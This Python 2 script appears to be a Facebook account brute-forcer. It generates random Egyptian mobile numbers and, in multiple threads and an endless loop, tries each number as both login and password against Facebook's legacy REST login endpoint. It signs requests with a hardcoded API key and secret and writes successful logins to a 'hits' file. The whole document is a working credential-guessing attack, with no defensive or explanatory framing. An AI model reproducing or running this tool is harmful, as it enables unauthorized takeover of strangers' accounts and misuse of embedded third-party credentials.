import threading
import random
import string
import hashlib
import json
from urllib import urlencode
import collections
import urllib2

phoneLen = 11
providers = ["012","015","011","010"]
Threadtimeout = 5
ThreadPoolSize = 20
storeThreads = []
validhits = set()

def threadManager(function,Funcargs,Startthreshold,Threadtimeout=5):
	if len(storeThreads) != Startthreshold:
		storeThreads.append(threading.Thread(target=function,args=tuple(Funcargs) ))
	if len(storeThreads) == Startthreshold:
		for metaThread in storeThreads:
			metaThread.start()
		for metaThread in storeThreads:
			metaThread.join(Threadtimeout)
		del storeThreads[::]

def accessToken(email,password):
    data = collections.OrderedDict()
    data["api_key"] = "882a8490361da98702bf97a021ddc14d"
    data["email"] =  str(email)
    data["format"]= "JSON"
    data["locale"] = "vi_vn"
    data["method"] = "auth.login"
    data["password"] = str(password)
    data["return_ssl_resources"] = "0"
    data["v"] = "1.0"
    sig = ""
    for key in data:
        sig +=  "{0}={1}".format(key,data[key])
    data["sig"] = hashlib.md5(sig+"62f8ce9f74b12f84c123cc23437a4a32").hexdigest()
    try:
        return json.loads(urllib2.urlopen("https://api.facebook.com/restserver.php?{0}".format(urlencode(data))).read())["access_token"]
    except:
        return False

def login(n):
	status = accessToken(n,n)
	if status != False:
		validhits.add(n)

def GenPhoneNumber():
	provider = providers[random.randint(0,len(providers)-1 )]
	numbers = (''.join(random.choice(string.digits) for i in range(phoneLen - len(provider) )))
	return "{}{}".format(provider,numbers)

old = 0
while(1):
	threadManager( login, [GenPhoneNumber()]  , ThreadPoolSize ,Threadtimeout)
	if len(validhits) != old:
		for n in validhits:
			open("hits.txt","a").write(str(n)+"\n")
		r = set(open("hits.txt","r").read().split("\n"))
		open("hits.txt","w").write("")
		for n in r:
			open("hits.txt","a").write(str(n)+"\n")
		old = len(validhits)
		print "[!] You Have {} Hits".format(len(validhits))
